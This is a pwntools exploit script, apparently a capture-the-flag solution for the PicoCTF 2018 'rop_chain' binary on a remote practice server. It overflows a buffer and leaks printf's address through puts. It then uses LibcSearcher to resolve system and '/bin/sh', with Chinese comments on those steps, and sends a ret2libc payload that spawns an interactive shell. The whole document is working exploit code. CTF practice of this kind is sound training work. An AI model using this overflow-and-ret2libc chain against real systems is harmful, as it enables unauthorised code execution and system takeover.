from pwn import *

context(log_level='debug')

#io=process("./PicoCTF_2018_rop_chain")
io=remote("node3.buuoj.cn",29142)
elf=ELF("./PicoCTF_2018_rop_chain")

io.recv()

puts_plt=elf.plt['puts']
printf_got=elf.got['printf']

main=0x804873B

#pop_rdi_ret=0x400733

ret=0x80483f6

payload=b'A'*(0x18+0x4)+p32(puts_plt)+p32(main)+p32(printf_got)

io.sendline(payload)


printf=u32(io.recv(4))

print(hex(printf))

io.recv()

from LibcSearcher import *  

libc = LibcSearcher('printf',printf)  
#获取libc加载地址  
libc_base = printf - libc.dump('printf')  
#获取system地址  
system_addr = libc_base + libc.dump('system')  
#获取/bin/sh地址  
binsh_addr = libc_base + libc.dump('str_bin_sh')  


payload=b'A'*(0x18+0x4)+p32(ret)+p32(system_addr)+b'AAAA'+p32(binsh_addr)

io.sendline(payload)

io.interactive()